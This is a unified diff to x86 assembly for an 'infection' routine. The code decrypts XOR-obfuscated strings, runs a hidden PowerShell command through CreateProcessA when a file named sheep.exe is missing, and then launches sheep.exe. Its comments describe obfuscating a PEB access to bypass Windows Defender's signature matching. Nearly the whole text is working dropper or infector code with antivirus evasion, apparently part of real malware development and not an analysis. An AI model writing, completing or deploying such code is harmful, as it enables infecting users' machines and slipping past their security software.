@@ -12,7 +12,7 @@ global main
 main:
    push ebp
    mov ebp,esp
-   sub esp,0x58
+   sub esp,0x68
    push esi
    push edi
    push ebx
@@ -36,6 +36,39 @@ infection__data__powershell:
    ;; db string_data
 infection__data:
    pop ebx                      ; get the pointer to the start of the data
+   
+   ;; allocate some space for our decrypted strings
+   mov eax, [ebx+(infection__data__sheep-infection__data__start)]
+   inc eax
+   mov ecx, eax
+   mov [ebp-4], 4
+   div [ebp-4]
+   test edx,edx
+   jz infection__alloc_sheep_aligned
+   mov eax, [ebp-4]
+   sub eax, edx
+   add ecx, eax
+
+infection__alloc_sheep_aligned:  
+   sub esp, ecx
+   mov [ebp-8], esp
+   mov [ebp-0xC], ecx
+
+   mov eax, [ebx+(infection__data__powershell-infection__data__start)]
+   inc eax
+   mov ecx, eax
+   div [ebp-4]
+   test edx,edx
+   jz infection__alloc_powershell_aligned
+   mov eax, [ebp-4]
+   sub eax, edx
+   add ecx, eax
+
+infection__alloc_powershell_aligned:
+   sub esp, ecx
+   mov [ebp-0x10], esp
+   mov [ebp-0x14], ecx
+   
    mov eax, 0xFFFFFFCF          ; bypass Windows Defender matching on fs:[0x30]
    inc eax                      ; I am convinced the Wacatac signature is just Microsoft telling us
    neg eax                      ; we are performing a "whack attack" and we should git gud
@@ -59,12 +92,12 @@ infection__data:
    mov esi, eax                 ; get function for GetFileAttributesA
 
    xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures
-   movups [ebp-0x58],xmm0
+   movups [ebp-0x68],xmm0
+   movups [ebp-0x54],xmm0
    movups [ebp-0x44],xmm0
    movups [ebp-0x34],xmm0
    movups [ebp-0x24],xmm0
-   movups [ebp-0x14],xmm0
-   mov dword [ebp-0x48],0x44
+   mov dword [ebp-0x58],0x44
 
    lea eax, [ebx+(infection__data__sheep-infection__data__start)] ; pointer to encrypted struct
    push eax
@@ -75,9 +108,9 @@ infection__data:
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
 
-   lea eax, [ebp-0x58]
+   lea eax, [ebp-0x68]
    push eax
-   lea eax, [ebp-0x48]
+   lea eax, [ebp-0x58]
    push eax
    push 0
    push 0
@@ -86,32 +119,33 @@ infection__data:
    push 0
    push 0
    lea eax, [ebx+(infection__data__powershell-infection__data__start)]
-   call decrypt_string
-   lea eax, [ebx+(infection__data__powershell-infection__data__start)+5]
+   push [ebp-0x10]
    push eax
+   call decrypt_string
+   push [ebp-0x10]
    push 0
    call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    test eax,eax
    jz infection__end            ; CreateProcessA failed
 
    push 0xFFFFFFFF
-   push dword [ebp-0x58]
+   push dword [ebp-0x68]
    call edi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
    test eax,eax
    jnz infection__end           ; WaitForSingleObject returns 0 on success
 
    xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures again
-   movups [ebp-0x58],xmm0
+   movups [ebp-0x68],xmm0
+   movups [ebp-0x54],xmm0
    movups [ebp-0x44],xmm0
    movups [ebp-0x34],xmm0
    movups [ebp-0x24],xmm0
-   movups [ebp-0x14],xmm0
-   mov dword [ebp-0x48],0x44
+   mov dword [ebp-0x58],0x44
 
 infection__payload_exists:
-   lea eax, [ebp-0x58]
+   lea eax, [ebp-0x68]
    push eax
-   lea eax, [ebp-0x48]
+   lea eax, [ebp-0x58]
    push eax
    push 0
    push 0
@@ -120,15 +154,20 @@ infection__payload_exists:
    push 0
    push 0
    lea eax, [ebx+(infection__data__sheep-infection__data__start)]
+   push [ebp-8]
    push eax
+   call decrypt_string
+   push [ebp-8]
    push 0
    call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
 infection__end:
+   add esp, [ebp-0xC]
+   add esp, [ebp-0x14]
    pop ebx
    pop edi
    pop esi
-   add esp,0x58
+   add esp,0x68
    pop ebp
 
 %ifdef TLS
@@ -139,21 +178,32 @@ infection__end:
 
    ;; [ebp+4]: the string struct
 decrypt_string:
-   mov eax,[esp+4]
+   push ebp
+   mov ebp, esp
    push esi
+   push edi
+   mov eax,[ebp+8]
+   mov edi,[ebp+0xC]
    mov ecx,[eax]
-   mov dl,[eax+4]
    lea esi,[eax+5]
+   mov al,[eax+4]
 
 decrypt_loop:
-   xor [esi], dl
+   mov dl, [esi]
+   xor dl, al
+   mov [edi], dl
    inc esi
+   inc edi
    dec ecx
    test ecx,ecx
    jnz decrypt_loop
 
+   mov dl, [esi]
+   mov byte [edi], dl
+   pop edi
    pop esi
-   ret 4
+   pop ebp
+   ret 8
    
    ; [ebp+4]: the dll module
    ; [ebp+8]: the 32-bit fnv321a hash value to look up
